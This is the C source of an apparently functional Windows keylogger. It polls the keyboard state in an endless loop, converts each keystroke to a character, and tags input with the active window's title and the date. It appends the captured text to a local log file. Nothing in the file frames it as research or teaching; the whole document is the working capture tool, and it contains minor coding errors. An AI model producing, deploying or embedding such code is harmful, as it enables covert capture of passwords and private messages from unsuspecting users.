#include <Windows.h>
#include <wchar.h>
#include <tchar.h>

#define FLUSH_THRESHOLD 200

TCHAR windowTitle[255];
BYTE kState[256];

TCHAR lastWindowTitle[255];
TCHAR charsBuffered[FLUSH_THRESHOLD];

// Time
const TCHAR* timeFormat = _T("%02d-%2d-%4d");
const TCHAR* windowDateTimeFormat = _T("\n\n[%s] %s\n");
// %02d are two chars, - is 1, we have two of them so (2 + 1 ) * 3, then for the year we have %04d so 4 chars
// the sum is 21, the problem is that we use _tsprintf() which requires to tell it the buffer size, so we must 
// divide the above number by sizeof(TCHAR), when the addition is even, we would have a too small buffer error.
// so we must always get an even number, this is why I add 1; Play with it to understand what I mean.
const size_t formattedTimeLen = ((((2 + 1) * 2 + (4)) * sizeof(TCHAR)) + 1) + 1 /*We must have even number*/;
TCHAR formattedTime[((((2 + 1) * 2 + (4)) * sizeof(TCHAR)) + 1) + 1 /*We must have an even number as size*/];
TCHAR messageWithTitle[400]; // should hold formattedTime and windowTitle

UINT charsBufferedCount = 0;

void WriteToFile()
{
	HANDLE hFile = CreateFile(
		TEXT("./filename.txt"),
		FILE_APPEND_DATA,
		FILE_SHARE_READ,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	DWORD dwBytesWritten;
	WriteFile(hFile, charsBuffered,
	          charsBufferedCount * sizeof(TCHAR),
	          &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

void AppendToBuffer(const TCHAR* str, UINT len)
{
	if ((charsBufferedCount + len) > FLUSH_THRESHOLD && charsBufferedCount != 0)
	{
		WriteToFile();
		charsBuffered[FLUSH_THRESHOLD - 1] = 0x00;
		memset(charsBuffered, 0x00, FLUSH_THRESHOLD);
		charsBufferedCount = 0;
	}

	const UINT srcSize = len <= FLUSH_THRESHOLD ? len : FLUSH_THRESHOLD;
	memcpy_s(charsBuffered + charsBufferedCount, FLUSH_THRESHOLD * sizeof(TCHAR), str, srcSize * sizeof(TCHAR));
	charsBufferedCount += srcSize;

	if (len > FLUSH_THRESHOLD)
		AppendToBuffer(str + FLUSH_THRESHOLD, len - FLUSH_THRESHOLD);
}

void ProcessKey(short scannedKey)
{
	const HWND hWnd = GetForegroundWindow();
	if (hWnd != NULL)
	{
		const size_t windowTitleLength = GetWindowTextLength(hWnd);
		if (windowTitleLength > 0)
		{
			const int textLength = GetWindowText(hWnd, windowTitle, 255);

			if (_tcscmp(windowTitle, lastWindowTitle) != 0)
			{
				_tcscpy_s(lastWindowTitle, 255, windowTitle);

				SYSTEMTIME system_time;
				GetLocalTime(&system_time);

				_stprintf_s(formattedTime, formattedTimeLen / sizeof(TCHAR), timeFormat, system_time.wDay,
				            system_time.wMonth,
				            system_time.wYear);

				_stprintf_s(messageWithTitle, 400, windowDateTimeFormat, formattedTime, windowTitle);
				AppendToBuffer(messageWithTitle, _tcslen(messageWithTitle));
			}
		}

		if ((scannedKey >= 48) && (scannedKey < 91))
		{
			DWORD dwProcessId;

			const DWORD dwThreadId = GetWindowThreadProcessId(hWnd, &dwProcessId);

			memset(kState, 0x00, 256);

			if (GetKeyboardState(kState) == TRUE)
			{
				const HKL hKeyboardLayour = GetKeyboardLayout(dwThreadId);
				wchar_t writtenCharacter[6] = {0};

				ToUnicodeEx(scannedKey, scannedKey, (BYTE*)kState, writtenCharacter, 4, NULL, hKeyboardLayour);
				AppendToBuffer(writtenCharacter, _tcslen(writtenCharacter));
			}
		}
		else
		{
			if (scannedKey == VK_BACK)
				AppendToBuffer(_T("[BACKSPACE]"), _tcslen(_T("[BACKSPACE]")));
			else if (scannedKey == VK_RETURN)
				AppendToBuffer(_T("\n"), _tcslen(_T("\n")));
			else if (scannedKey == VK_SPACE)
				AppendToBuffer(_T(" "), _tcslen(_T(" ")));
			else if (scannedKey == VK_TAB)
				AppendToBuffer(TEXT(" [TAB] "), _tcslen(_T("[TAB]")));
			else if (scannedKey == VK_SHIFT || scannedKey == VK_LSHIFT || scannedKey == VK_RSHIFT)
				AppendToBuffer(TEXT("[SHIFT]"), _tcslen(_T("[SHIFT]")));
			else if (scannedKey == VK_CONTROL || scannedKey == VK_LCONTROL || scannedKey == VK_RCONTROL)
				AppendToBuffer(_T("[CONTROL]"), _tcslen(_T("[CONTROL]")));
			else if (scannedKey == VK_ESCAPE)
				AppendToBuffer(_T("[ESCAPE]"), _tcslen(_T("[ESCAPE]")));
			else if (scannedKey == VK_END)
				AppendToBuffer(_T("[END]"), _tcslen(_T("[END]")));
			else if (scannedKey == VK_HOME)
				AppendToBuffer(_T("[HOME]"), _tcslen(_T("[HOME]")));
			else if (scannedKey == VK_LEFT)
				AppendToBuffer(_T("[LEFT]"), _tcslen(_T("[LEFT]")));
			else if (scannedKey == VK_UP)
				AppendToBuffer(_T("[UP]"), _tcslen(_T("[UP]")));
			else if (scannedKey == VK_RIGHT)
				AppendToBuffer(_T("[RIGHT]"), _tcslen(_T("[RIGHT")));
			else if (scannedKey == VK_DOWN)
				AppendToBuffer(_T("[DOWN]"), _tcslen(_T("[DOWN]")));
			else if (scannedKey == VK_OEM_PERIOD || scannedKey == VK_DECIMAL)
				AppendToBuffer(_T("."), _tcslen(_T(".")));
			else if (scannedKey == VK_OEM_MINUS || scannedKey == VK_SUBTRACT)
				AppendToBuffer(_T("-"), _tcslen(_T("-")));
			else if (scannedKey == VK_SNAPSHOT)
				AppendToBuffer(_T(","), _tcslen(_T(",")));
			else if (scannedKey == VK_CAPITAL)
				AppendToBuffer(_T("[CAPSLOCK]"), _tcslen(_T("CAPSLOCK")));
		}
	}
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR lpCmdLine,
	_In_ int nCmdShow)
{
	short scannedKey;

	SHORT lastKey = 0;
	DWORD msec = 0;
	while (TRUE)
	{
		Sleep(50);


		for (scannedKey = 8; scannedKey <= 222; scannedKey++)
		{
			const SHORT result = GetAsyncKeyState(scannedKey);

			// Check if the most significant bit in the SHORT, is set(1)
			// if ((result >> 15) != 0) Or better readability
			if (((result >> 15) & 0x1) == 1)
			{
				if (scannedKey != lastKey || msec > 200)
				{
					_tprintf(_T("%.1s"), (wchar_t*)& scannedKey);
					ProcessKey(scannedKey);
					lastKey = scannedKey;
					msec = 0;
				}
				else
				{
					msec += 50;
				}

				break;
			}
			else if ((result & 0x0001) == 1)
			{
				// The key is not down but it was pressed since the las call to GetAsyncKeyState
			}
		}
	}
	free(kState);
}
